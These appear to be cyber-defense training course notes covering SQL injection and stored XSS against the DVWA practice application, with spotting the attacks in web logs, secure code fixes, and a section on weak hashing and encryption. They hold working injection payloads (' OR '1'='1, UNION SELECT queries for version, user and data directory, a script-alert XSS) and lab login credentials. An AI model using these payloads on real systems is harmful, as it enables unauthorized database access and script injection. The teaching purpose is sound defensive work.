In addition, web applications frequently exploit user input as part of their SQL queries. However, SQL is often constructed as a string in the underlying programming language and passed to the database. If the programmer is not careful, there is a blurred line between user input and SQL query structure, allowing users to modify the query structure and change the query's intended behavior. This is done by using input that makes use of the SQL query syntax. Since the user input is concatenated to the rest of the query, the database interprets the SQL syntax in the user input as part of the query, causing the query to change into something potentially harmful.

------------------------------------------------

SQLI Fundamentals
To understand how SQLIs happen, consider the following SQL query:

![image](https://github.com/user-attachments/assets/ac08fba1-c3a6-44da-8912-7e5ffa2f87e3)



Figure 7.3-2 displays a basic query used to authenticate a user on a web application. In this scenario, the username input gets placed between the quotes after username and the password input between the quotes after password. If the user entered a username of 'admin' and a password of 'test123,' the query that gets passed to the database is the following:

![image](https://github.com/user-attachments/assets/28bc7c7d-8ef3-4ea1-bb68-30fd0a7b434d)

If the underlying programming language concatenates the user input, the SQL query interpreter converts any special characters in the username or password. This allows the query syntax to be changed. For example, consider what happens if the username is set to a single quote, but the password remained test123. The resulting SQL query is the following:

![image](https://github.com/user-attachments/assets/b42a89d3-0fa5-46df-a72a-f88b99b039fd)

The query example above contains three single quotes in a row to the database server. These quotes are interpreted as two strings side by side. The first string, delimited by the first two single quotes, is interpreted as an empty string. The third quote starts another adjacent string that ends with the equal sign after the word password. Adjacent strings are typically valid syntax in SQL queries. However, the second string is immediately followed by the word test123'. The database interprets the string as a keyword. But test123' is not a valid keyword in SQL, so the database throws an error for an ill-formed SQL query.


The main point from the example above is that by including certain special characters, the attacker causes the database to misinterpret the SQL query and even inject SQL keywords that were not originally there. This can allow an attacker to inject functionality into the SQL query.


Now, consider a common proof of concept attack for this vulnerability type, in which the username is set to admin and the password to the following:
password' or 1='1

![image](https://github.com/user-attachments/assets/d37347ee-009b-40b4-9df9-25050eb540fd)


he first quote in the password field is interpreted as the end of the password value.
The or is interpreted as a logical OR operator.
The 1='1' is interpreted as an added condition.

In other words, find all users with the username admin and either the password equal to password or where the condition 1=1 is true. The final condition is always true, and so the check passes regardless of whether the password is actually password.


Common Characters and Syntax


SQLI attacks use common syntax and characters to leverage vulnerabilities in database design. Table 7.3-1 includes characters — as defined by Microsoft — that are frequently seen in SQLI attacks:

![image](https://github.com/user-attachments/assets/a0e39ece-e4b5-4e29-a3bc-a2b3cb632eb6)


Characters that perform delimiter functions determine the limits or boundaries of the areas they are querying. 


Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

--------------------------------------

Identifying SQLI in Logs
Log files provide a valuable piece of evidence in helping identify a web application attack. The logs collected on servers and applications record all actions and requests made to the device. Hidden within the logs are pieces of information that identify the type of attack, when the attack occurred, and what IP address was responsible.

﻿

Web logs are log files that are created and maintained by web servers on a network. Web logs contain information about the connections and requests made to the website or application — information that is critical in an investigation. On a typical web server, there are two types of log files: access.log and error.log. The access.log file contains all requests made by users interacting with the application. Information in the access.log file includes what pages the users are viewing, the status of requests, and the speed requests were served. The error.log contains all errors the server encountered. For the purposes of defense, security, and investigation, the access.log is the primary focus.

﻿

Expected Web Log Entry
﻿

Below is a sample entry in the access.log. The entry typically — and expectedly — contains the successful login of the DVWA:

127.0.0.1 - - [20/Oct/2021:15:01:12 -0400] "GET /dvwa/login.php HTTP/1.1" 200 1415 "http://localhost/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 20, 2021 @ 15:01:12 
Time on the server (relative to UTC): -0400
Request made: GET /dvwa/login.php HTTP/1.1" 200
The request here is the user logging into the DVWA via the use of HTTP. The number 200 is a Hypertext Transfer Protocol (HTTP) status code — 200 indicates the request succeeded. In this case, the user was able to log in.
URL: http://localhost/ 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (Konqueror Hyper Text Markup Language [KHTML], like Gecko) Chrome/44.0.2403.155 Safari/537.36
Web Log Entry with SQLI Attack
﻿

Below is a sample entry in the access.log including a successful SQLI attack:

127.0.0.1 - - [21/Oct/2021:09:30:02 -0400] "GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200 4342 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 21, 2021 @ 09:30:02 
Time on the server (relative to Greenwich Mean Time): -0400
Request made: GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200
The request here is the user making a request within the DWVA SQLI page. The user requested ?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit. The HTTP status code 200 indicates the request succeeded. 
URL: http://localhost/dvwa/vulnerabilities/sqli
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
The use of the UNION operator, as well as the URL encoded @ symbol (hex %40) for the global variable, is an immediate red flag and indicative of a potential attempt to leverage the SQL database. The log entry above was taken from the SQLI lab earlier in this lesson where SQLI was used to derive the database's location. The query is provided below:

'UNION SELECT null, @@datadir#
﻿

--------------------------------

Conducting SQLI
Gain insight on how the adversary approaches and conducts a SQLI attack to help identify defensive strategies. Using the DVWA, a vulnerable web application using SQL is exposed.

﻿

Workflow

﻿

1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open XAMPP Control Panel from the taskbar:


2. Open XAMPP Control Panel from the taskbar:





Figure 7.3-6


The XAMPP Control Panel looks like Figure 7.3-7: 


![image](https://github.com/user-attachments/assets/0a21ae8b-471c-4309-81d5-c4ad4e167848)

NOTE: XAMPP is a free, open-source Apache web server distribution used primarily as a PHP development environment. Throughout this lesson, XAMPP is used to host the DVWA. 


3. Within the XAMP Control Panel, for the Apache and MySQL modules under Actions, select Start:


![image](https://github.com/user-attachments/assets/350d3a4d-96c3-42bd-b535-528b655dd3b3)

4. Open Google Chrome. In the Search Bar, enter localhost and select Enter: 


![image](https://github.com/user-attachments/assets/70f6b565-e905-4160-a024-053346342ee3)


6. Log in to the DVWA using the following credentials:
Username: admin
Password: password

![image](https://github.com/user-attachments/assets/c1df342b-067e-449f-9366-7a1d22b4c395)

7. On the left menu, select DVWA Security. In the DVWA Security - Security Level, select Low > Submit:

![image](https://github.com/user-attachments/assets/98da00d5-408f-4ccd-bdaf-024bdd4ef615)

NOTE: The web application's vulnerability level is set by adjusting the security level. 


8. On the left menu, select SQL Injection: 

![image](https://github.com/user-attachments/assets/996bf564-46be-4d72-9d7f-31c1c4e0bf1b)



9. To leverage an SQLI, the first step is identifying how the query is structured. Once it is determined how the query is structured, parameters can be injected to exploit the vulnerabilities in the design. In the User ID input box, enter 1 and select Submit:

![image](https://github.com/user-attachments/assets/3f901fc6-5d25-40cc-8952-4c1238edbd2a)

The results return the First name and the Surname of the user with an ID: 1 in the database. 


While the backend of the query is not visible within the DVWA window, the structure of the SQL query is provided below:
SELECT First_Name,Last_Name FROM users WHERE ID='1';



The query selects all first and last names from the users table whose Identifier (ID) equals 1. One record can only have one ID, so the account with ID = '1' is returned. 


10. In the User ID input box, enter 2 and select Submit. The user Gordon Brown is returned. Assembling all the users in the database using this method would not be feasible; the design of the query can be leveraged to show all users in the database at once. 


11. In the User ID input box, enter invalid' OR '1'='1 and select Submit. The following results are returned: 

![image](https://github.com/user-attachments/assets/c2d64577-311a-4c0e-a0fb-9b80cb0c8c49)


The query leverages the way the database is queried to return all the users in the database. 


In SQL, the query was executed using this structure:
SELECT first_name, last_name FROM users WHERE user_id = 'invalid' OR '1'='1';



The WHERE clause in this query is used to filter — or narrow — the results of the query. The query is asking for all the records that have invalid as the user_id OR any record that matches the expression '1'='1.' Since 1 is always equal to 1, there is no filtering — or limiting — and ALL records in the users table are returned.


Now that all the users in the database have been identified, the next step is to identify the type and version the database is operating. If the type and version of the database can be identified, then specific vulnerabilities can be exploited and leveraged. 


12. In the User ID input box, enter SELECT version() AND SELECT @@version# and select Submit.


The @@ symbol in MySQL is tied to global variables. All global variables are held and managed in the SQL server. 


The # symbol is a hash for comments within MySQL. In the query, the # is used in SQLI to comment out the quote mark used by the web application to prevent further processing and muck up the query. It is important to note that the # symbol is not a universal symbol for comments across all languages. 


NOTE: No results are returned. To fix the query, a UNION operator must be introduced. The UNION operator is used in SQL to combine two or more SELECT statements. 


13. In the User ID input box, enter ' UNION SELECT @@version# and select Submit:

![image](https://github.com/user-attachments/assets/35288977-7c8f-4b00-8143-a36892eb9734)

The output indicates that the size of the two SELECT statements is not equal. The two SQL queries are:
SELECT first_name, last_name FROM users WHERE user_id = '<variable from user input>';

SELECT @@version;



Based on these two queries and the error statement from the database, the differences between the two queries should be obvious. The first query is retrieving two fields from the table, and the second query is retrieving only one field. One of the requirements for a UNION operator is that the two queries must return the same number of fields, otherwise, the two outputs cannot be combined. To fix this situation, modify the query by entering '  UNION SELECT null, @@version#. The addition of null value has the query add columns as needed. The null value is used because it is converted to any data type within the database. The following results are returned:

![image](https://github.com/user-attachments/assets/01999822-a01d-444b-b1e5-e8e6cc483eba)

The results indicate the database is running MariaDB version 10.4.21, an open source fork of the mySQL database.


14. Using the same query design as step 12, in the User ID input box, enter '  UNION SELECT null, @@hostname# and select Submit: 

![image](https://github.com/user-attachments/assets/ef6ddc94-2599-4a13-a7d9-537d05c90732)

The results indicate the database is running on the ch-tech-1 host. 


15. To find the current database user, two queries can be utilized: SELECT user() or SELECT current_user. However, to leverage the design of the web application's SQL query, in the User ID input box, enter '  UNION ALL SELECT current_user(),user() #. Since there are two fields queried from the user table, two global variables — or SQL functions — can be queried in the injected query.

![image](https://github.com/user-attachments/assets/2c00eef6-4d5c-424b-a405-dbf52c5ca656)

The current user on the database is root@localhost. The addition of the ALL operator ensures that duplicate results are not removed and all entries are returned in the combined UNION results.


16. To find the location of the database by file path, datadir needs to be leveraged. In SQL, datadir stands for data directory and is the location (file path) where the database is maintained. To find the database location, in the User ID input box, enter '  UNION SELECT null, @@datadir# and select Submit: 

![image](https://github.com/user-attachments/assets/e1113ec9-c1bc-44bf-ab16-d6055f71ac6a)

NOTE: The database is running out of the c:\xampp\ directory. Xampp was started at the beginning of this lesson. 


With a few simple queries leveraging the UNION function, key information was discovered that can be leveraged by the adversary. The information included all the users in the database, the database version, the database's host name, and the file location where the database is running. 

----------------------------------------------

Identifying SQLI in Logs
Log files provide a valuable piece of evidence in helping identify a web application attack. The logs collected on servers and applications record all actions and requests made to the device. Hidden within the logs are pieces of information that identify the type of attack, when the attack occurred, and what IP address was responsible.

﻿

Web logs are log files that are created and maintained by web servers on a network. Web logs contain information about the connections and requests made to the website or application — information that is critical in an investigation. On a typical web server, there are two types of log files: access.log and error.log. The access.log file contains all requests made by users interacting with the application. Information in the access.log file includes what pages the users are viewing, the status of requests, and the speed requests were served. The error.log contains all errors the server encountered. For the purposes of defense, security, and investigation, the access.log is the primary focus.

﻿

Expected Web Log Entry
﻿

Below is a sample entry in the access.log. The entry typically — and expectedly — contains the successful login of the DVWA:

127.0.0.1 - - [20/Oct/2021:15:01:12 -0400] "GET /dvwa/login.php HTTP/1.1" 200 1415 "http://localhost/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 20, 2021 @ 15:01:12 
Time on the server (relative to UTC): -0400
Request made: GET /dvwa/login.php HTTP/1.1" 200
The request here is the user logging into the DVWA via the use of HTTP. The number 200 is a Hypertext Transfer Protocol (HTTP) status code — 200 indicates the request succeeded. In this case, the user was able to log in.
URL: http://localhost/ 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (Konqueror Hyper Text Markup Language [KHTML], like Gecko) Chrome/44.0.2403.155 Safari/537.36
Web Log Entry with SQLI Attack
﻿

Below is a sample entry in the access.log including a successful SQLI attack:

127.0.0.1 - - [21/Oct/2021:09:30:02 -0400] "GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200 4342 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 21, 2021 @ 09:30:02 
Time on the server (relative to Greenwich Mean Time): -0400
Request made: GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200
The request here is the user making a request within the DWVA SQLI page. The user requested ?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit. The HTTP status code 200 indicates the request succeeded. 
URL: http://localhost/dvwa/vulnerabilities/sqli
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
The use of the UNION operator, as well as the URL encoded @ symbol (hex %40) for the global variable, is an immediate red flag and indicative of a potential attempt to leverage the SQL database. The log entry above was taken from the SQLI lab earlier in this lesson where SQLI was used to derive the database's location. The query is provided below:

'UNION SELECT null, @@datadir#

--------------------------------

Accessing Web Logs in XAMPP
Walk through accessing web logs collected in XAMPP. Web logs are not accessed through XAMPP in this lesson, however, it is useful to know where the logs can be accessed and viewed for future use. 

﻿

Workflow

﻿

1. Log in to the ch-tech-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Access the XAMPP Control Panel, within the Apache module, and select Logs:


![image](https://github.com/user-attachments/assets/95144fef-40fc-41fd-ae91-14026ee455be)




3. Select Apache (access.log), to open the logs using Notepad:

![image](https://github.com/user-attachments/assets/570475c5-0d07-4a46-bb84-0506682fc629)

--------------------------------------------------------

Cross-Site Scripting Overview
XSS is an attack in which its ultimate purpose is to inject HTML — known as an HTML injection — into a user’s web browser. XSS is one of the oldest web application attacks known and is dated to around 1996–1998, when it was possible to control frames within a webpage through injected code, providing the crossing of website boundaries. Currently, XSS is still on top of the OWASP Top 10 Web Application Security Risks. XSS is considered an attack against the user of a vulnerable website; it is difficult to anticipate and prevent. Knowledgeable developers actively trying to prevent attacks may be vulnerable to other possible forms of attack that they are not aware of.

﻿

HTML and CSS Markup Attacks
﻿

The most basic of XSS attacks is the insertion of HTML and Cascading Style Sheets (CSS) content into the HTML of a website. This simple attack is executed by injecting a comment or annotation that is then displayed on the website. Website users do not have any power to stop this attack as they are not able to turn off HTML rendering in the browser (in the same way that they can turn off JavaScript or images). The adversary who accomplishes an exploit like this can obscure part or all of the page, and render official-looking forms and links for users to interact with.

﻿

Stored XSS
﻿

Stored XSS is a version of the attack where input is stored on the target server. Typically the input is stored in a database, message forum, log, or comment field. The user then interacts with the website, which retrieves the stored data from the website and sends it to the user. 

﻿

Reflected XSS
﻿

As defined by OWASP, reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user-provided data. To execute the reflected version of the XSS attack, an injected script reflects off the target server. The reflection is done by a page search result, an error message, or another created message by the user. Reflect XSS is a very damaging style of attack because it weaponizes the trust of the server from which the code is reflecting. 

﻿

Document Object Model-Based XSS
﻿

Document Object Model (DOM)-Based XSS, also referred to as Type-0 XSS, is a version of the attack where the execution of the attack occurs as a result of modifying the DOM environment in the target's browser. The modification occurs within the client-side script, as a result, the script does not perform as expected. When executed properly, the page itself — the HTTP response — does not change, but the client-side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

-----------------------------------------
![image](https://github.com/user-attachments/assets/5f9e9b2e-7b12-416d-8a78-7e4e1c9a6ace)

Conducting an XSS Attack
Walk through a stored XSS web attack, as seen from an adversarial perspective. Using the DVWA, a vulnerable web application is exposed, sending users a variety of wrong and potentially malicious information, including pop-up messages and different URLs.

﻿

Workflow

﻿

1. Log in to the ch-tech-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Ensure the XAMPP Control Panel is open and that Apache and MySQL are still running.

﻿

3. Open Google Chrome, access DVWA ( http://localhost/dvwa/login.php ), and log in using the following credentials:

Username: admin
Password: password
﻿

NOTE: If the web browser is closed or the DMVA is logged out, the DVWA Security Level resets to Impossible. Ensure the DVWA Security Level remains at Low.

﻿

4. On the left menu, select XSS (Stored): 

![image](https://github.com/user-attachments/assets/647ae6dd-e1c4-4a6e-ab32-a2d2bf1c9826)


![image](https://github.com/user-attachments/assets/dcbfbd49-dcba-48bb-a767-d66cec98d93e)

A stored XSS is a version of the attack where input is stored on the target server. The user interacts with the website and retrieves the stored data from the website, however, the data is not safe to render in the browser. To demonstrate this attack, a simple DVWA message board web application is set up. The DVWA is vulnerable to stored XSS attacks. In the message board application, the top input box is for a user's name and the bottom input box is for the desired message. 


5. Enter the following information, then select Sign Guestbook:
Name: User1
Message: Hi

Notice the message has been posted to the message board and is displayed below the input boxes:

![image](https://github.com/user-attachments/assets/687422c5-615c-40d2-b09f-b1c5ea1a1fad)



6. Enter the following information, then select Sign Guestbook:
Name: User1
Message: <script>alert("You've been hacked!")</script>

7. Select the XSS (Stored) tab again. Notice that when the page is refreshed the script executes, and an XSS alert displays You've been hacked!:

![image](https://github.com/user-attachments/assets/b376ad7f-be70-400d-b6aa-dd160dda07f3)

NOTE: Every time the XSS (Stored) page is loaded, the XSS alert appears until the database is cleared or the vulnerability is patched. 


While this is a simple demonstration of how a stored XSS attack operates, the vulnerability can be leveraged to have more dangerous consequences. Instead of popping a message box on the screen, the adversary could update the script to send the user to a new URL, with the intent to store and distribute malicious code from the new destination. 


8. Select Clear Guestbook. This clears the database and stops the message box from appearing. 


9. At the bottom of the page, select View Source to view the source code of the web application. 


The following source code is displayed:

![image](https://github.com/user-attachments/assets/54ba133d-6efa-4f84-b44e-418d52bef6b8)

----------------------------------------

Current Source Code Breakdown | Insecure
The source code of the application is provided below. It is important to review the source code to identify flaws in the design that can be exploited in XSS attacks. The source code can be broken down into four major blocks, as shown in Figure 7.3-28: 


![image](https://github.com/user-attachments/assets/37438eb0-7a6e-4b8f-a277-427d9538b0f1)

Block 1: This portion of the code collects text from the Name and Message input boxes. The trim( $_POST[ 'mtxtMessage' ] ); trims away any whitespace. 
Block 2: This portion of the code sanitizes the Message input box. The stripslashes($message) portion of the code removes any slashes or excessive (>= 2) spaces. 
Block 3: This portion of the code sanitizes the Name input box. While this portion is designed to sanitize the input of the Name input box, no real sanitization is done. The code simply receives the input and prepares it to be entered into the database. 
Block 4: This portion of the code takes the input from both the Name and Message input boxes and updates the guestbook table in the SQL database.

In the current state, the code for the DVWA is highly vulnerable and can be leveraged by the adversary to conduct potentially Malicious Cyberspace Activity (MCA).


A Secure Source Code Breakdown


Workflow


1. Within the Stored XSS Source window, select Compare All Levels. DVWA displays four sets of code blocks: Low, Medium, High, and Impossible Stored XSS Source code. 


2. Scroll to the Impossible Stored XSS Source code block. 


Major changes have been made to the source code to improve the security and patch the vulnerabilities that were exploited in the XSS (Stored) attack. 
The code can be broken down into five major blocks, as shown in Figure 7.3-29:

![image](https://github.com/user-attachments/assets/f742144d-57df-4eb8-b364-8820a4f4d66a)


Block 1: This portion of the code includes the use of an anti-Cross Site Request Forgery (CSRF) token. The anti-CSRF token is in place to prevent a CSRF attack. A CSRF is an attack where the adversary leverages authentication to have the user execute desired commands and actions on the web application.
Block 2: This portion of the code is unchanged. The code collects text from the Name and Message input boxes. The trim( $_POST[ 'mtxtMessage' ] ); trims away any whitespace. 
Block 3 and 4: This portion of the code sanitizes the Message and Name input boxes in a more secure and effective approach. First, the stripslashes( $message ); portion of the code removes backslashes added by previous input handling. Next, it escapes special characters that could be misinterpreted in SQL queries by utilizing  mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) to prevent SQL injection attacks. Finally, the $message = htmlspecialchars( $message ); replaces characters that could be interpreted as HTML or JavaScript code with predefined characters. The replacement characters render the attack technique useless. The same techniques are used to sanitize the Name input box. As shown in Figure 7.3-30, typical characters needed to execute an XSS attack are replaced:


![image](https://github.com/user-attachments/assets/37102f8f-fe87-492c-9f86-2a060f4afddc)

Block 5: This portion of the code continues to collect the input from both the Name and Message input boxes and update the guestbook table in the SQL database, however, it now uses a different approach. The code now uses bind parameters $data->bindParam to update the SQL database. Bind parameters are a method to transport data to and from a database. Bind parameters use a placeholder value when transporting data, then provide the actual values in a separate Application Programming Interface (API) call. This method prevents any use of an SQLI into the database. 

3. Exit the Stored XSS source code window.


4. On the left menu, select DVWA Security:

![image](https://github.com/user-attachments/assets/102434bc-0349-48ef-8dbb-6716df205790)

5. In the Security Level drop-down menu, select Impossible > Submit.

![image](https://github.com/user-attachments/assets/1f467509-a8d5-4f41-a95c-9356692c00c8)


NOTE: The bottom left corner of the DVWA now displays Security Level: Impossible. The impossible security level implements the secure code that was examined in step 2.

![image](https://github.com/user-attachments/assets/028b2b90-e259-4291-b405-e1efa54731c4)


![image](https://github.com/user-attachments/assets/2be874c8-2520-4e12-bffa-990a435d1190)


![image](https://github.com/user-attachments/assets/fdfc2711-d45c-41b4-8817-1f8929387f50)

Notice this attempt at the same attack is thwarted by the design of the source code. All use of HTML special characters have been replaced. Additionally, any escape characters received a slash added prior to the character, which stops the potential use of any scripting and prevents the stored XSS attack from occurring. 

---------------------------------

Identifying XSS Test Strings 
Often adversaries test websites and applications to find vulnerabilities in their builds. A simple and effective way to test for a vulnerable website or application is through the use of the alert() function. As demonstrated previously, the alert() function spawns a window in the browser. For the purposes of testing, the window may not include any information. Adversaries use this function in tandem with collecting traffic and return the websites and applications that spawned alerts. Websites and applications that spawned alerts are vulnerable and can be exploited. With the newly-gained intelligence, the next attack on the website or application can potentially direct the user to a different webpage entirely, having a far greater impact.

﻿

Expected Web Log Entry
﻿

Below is a sample entry in the access.log. The entry is typical and expectedly contains the successful access of the XSS (Stored) tab of the DVWA:

127.0.0.1 - - [19/Oct/2021:11:20:14 -0400] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 4800 "http://localhost/dvwa/security.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Web Log Entry with XSS Attack
﻿

Below is a sample entry in the access.log, which includes a successful XSS attack:

127.0.0.1 - - [19/Oct/2021:11:20:14 -0400] "GET /dvwa/vulnerabilities/xss_s/<script>alert("You've been hacked!")</script>  HTTP/1.1" 200 4800 "http://localhost/dvwa/security.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

NOTE: Both the < and > characters and the alert() function in a web log entry are primary identifiers of an XSS attack. 

---------------------------

Web Application Attacks Mitigation 
Governing and sanitizing input in web applications is the primary defense against attacks. The personnel responsible for designing and administrating the systems that are utilized by web applications must be diligent in regulating how users interact with the application. Characters — such as the ones used in the SQLI and XSS attack: ! $ ^ & * ( ) ~ [ ] \ | { } ' " ; < > ? - ` — that help users gain unauthorized information should not be permitted. While the user may be able to enter these characters, the backend code needs to be developed to remove them. Functionality — such as htmlspecialchars — should be implemented where the characters are escaped, quoted, or encoded, thus thwarting a potential attack. Additionally, it should be verified that data entered into the application is only in the expected type, format, and length. Governing and sanitizing need to be top priorities when designing and configuring a web application, as it is the primary defense against attacks.

Analyzing Web Traffic Logs
The Virtual City City Hall (VCCH) network has experienced a potential security breach. VCCH hosts a website that contains multiple applications, accessed by external network users. Users interact with the website to access applications and retrieve information. The security team needs help analyzing and assessing the web logs from the suspected attack. The security team identified that the account doct.d was accessed after multiple failed logins. The account was then used to access unauthorized information. The security team needs help in identifying how the adversary accessed unauthorized information and what type of information may have been stolen. The security team has uploaded the logs to the win-hunt VM. Access the VM and help investigate the attack. 

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2.  Open the saved log file 25OCT21_Web_Logs.txt from the desktop. 

﻿

3. Review the logs to investigate the cyber attack.

----------------------------------------

Six Entries

![image](https://github.com/user-attachments/assets/700a8b4e-1cab-4cef-ac39-4a1c19102119)

At 12:34:34, the user has authenticated — or bypassed authentication — with the application. 


Application Paths


Within the application portal, applications are reached via the /apps/functions/health/ directory.


Apps holds the functions that the VCCH performs. Within the functions directory are the services that users utilize to access the required information. In the example above, the user was accessing the VCCH health function. The health function allows users to access information pertaining to their medical records. 

------------------------------

########### CDAH-M7L4 Stack Exploitation ############



--------------------------------------------

########### CDAH-M7L5 Attacks on Weak Cryptography #############


Cryptography Overview
Trainees may have encountered the Confidentiality, Integrity, and Availability (CIA) triad. The CIA triad is a model used to govern and guide policies related to information security within an organization.

Confidentiality: Ensures unauthorized individuals cannot access sensitive and private information. 

Integrity: Prevents unauthorized individuals from modifying or deleting data.

Availability: Addresses the access component and states that data should be accessible when needed.

Cryptography addresses the confidentiality and integrity aspects of the CIA triad with encryption and hashing.

![image](https://github.com/user-attachments/assets/0d210d0e-c237-4d21-b9bd-6a70c642ff87)

Cryptographic algorithms should adhere to Kerchoff's principle to be effective. Kerchoff's principle states that a cryptographic system should remain secure even if everything is known about that system, except for the key. In other words, security should not be achieved through obscurity.


Hashing


Hashing is one of the cornerstones of cryptography and involves the usage of a one-way function on arbitrary input data to always produce the same output. It is a powerful tool to use to verify data integrity and is often used with many authentication mechanisms.


![image](https://github.com/user-attachments/assets/fbfcadd4-b8a4-41ae-909a-4a9465058aaa)


Encryption


Encryption scrambles data so that unauthorized individuals cannot decipher the original meaning of a message. Encryption primarily covers the confidentiality aspect of the CIA triad. However, it does not prevent unauthorized individuals from modifying the data.

![image](https://github.com/user-attachments/assets/31cbfd42-0ed6-47b2-a80a-ebd7f6e1e52b)

Hashing and encryption work in tandem to provide confidentiality and integrity. The following sections delve into these two cryptographic tools.

-------------------------------------------------

Hashing Scenario
Hashing involves the use of an irreversible function, known as a hashing function, to create a fixed-length output known as a hash or Message Digest (MD).

﻿

There are three features of hashing: consistency, compression, and lossiness.

Consistency: Two sets of identical data have the same hash.

Compression: Reducing datasets into a fixed space.

Lossiness: Being unable to determine what the original data was by looking at the output.

Example: A simple hashing function is evens or odds. An even number always returns 0 when divided by 2 whereas an odd number does not — consistency. Evens or odds also map an infinitely large set of integers into just one bit — compression. Also, it is impossible to determine the original number being provided with a value of 0 for even and 1 for odd — lossiness.

﻿

Hashing is frequently used in data integrity verification and in many authentication mechanisms. The following scenario examines hashing as a tool used in authentication.

﻿

Scenario: The mission partner has faced a few different network attacks. While their perimeter defenses are effective at minimizing most of the potential damage, there were two occasions where attackers breached the perimeter. In each attack, they were able to steal the entire password database. Soon after, users reported seeing odd last login times in the applications they were using. The mission partner requested CPT assistance in hardening their password storage system.

﻿

A custom implementation of a password storing system is examined and issues associated with it are identified.

﻿--------------------------------------------

 Hashing Scenario Recap
In this scenario, a mission partner's custom implementation of a password storage solution was examined. A cryptographically insecure algorithm was used and the hashes were stored unsalted, which enabled a rainbow table attack. It is recommended to use a more secure algorithm and salt the hashes.

﻿

Hashing Best Practices
﻿

The National Institute of Standards and Technology (NIST) recommends usage of the following algorithms:

SHA2
SHA3
SHAKE128
SHAKE256
While formally deprecated in 2011, SHA0 or SHA1 may still appear in some publications, despite being deemed cryptographically insecure with a few publicly known attacks. SHA0 or SHA1 may both be referred to as SHA in different contexts. SHA0 and SHA1 both only produce hashes of 160 bits.

﻿

SHA2 and SHA3 can produce hashes of set sizes between 224 and 512 bits. References to SHA*, (i.e., SHA256), typically mean the algorithm used is SHA2 while SHA3 is SHA3*.

﻿

If seen in mission partner networks, make a recommendation to switch to more secure algorithms. If a custom hashing algorithm is seen, urge the mission partner to change to an algorithm approved for Federal systems, as custom algorithms are not evaluated or tested by expert committees.

﻿

In addition to salting, another practice that can further secure password storage is peppering. Peppering is the practice of encrypting the password database or the individual hashes with an encryption key so that attackers need to decrypt the data to access the hashes. Unlike a salt, a pepper is the same for the entire database and is not stored in the database.

![image](https://github.com/user-attachments/assets/b73fe3f3-2fcf-4d9e-b21e-0bbedee29c1a)


----------------------------------------

Encryption Scenario
Encryption is focused on the confidentiality aspect of the CIA triad, and its function is to scramble the data so that unauthorized individuals cannot read the data being exchanged. Unlike hashing, which is a one-way function, encryption is a two-way function, which means it can be reversed. There are two primary forms of encryption: symmetric and asymmetric. Symmetric encryption uses the same key to encrypt and decrypt, while asymmetric encryption uses one key to encrypt and another key to decrypt. Symmetric encryption is typically used to secure communications, while asymmetric encryption is typically used in Public Key Infrastructure (PKI) to validate the identity of the server or client as well as key exchange. The following scenario examines a custom implementation of a program that uses symmetric encryption.

﻿

Scenario: The mission partner uses a custom application to encrypt sensitive documents sent over the network. However, they noticed information from these documents on open-source business databases. They requested CPT assistance in locating the root of the problem.

﻿-----------------------------------------------

 Encryption Scenario Recap
In this lab, a mission partner's encryption script was examined, which used a weak algorithm for encryption and utilized a weak encryption mode that enabled attackers to eventually see patterns in the encryption and deduce the plaintext. Recommendations made to the mission partner include using a stronger encryption algorithm such as AES and using an encryption mode that is not ECB.

﻿

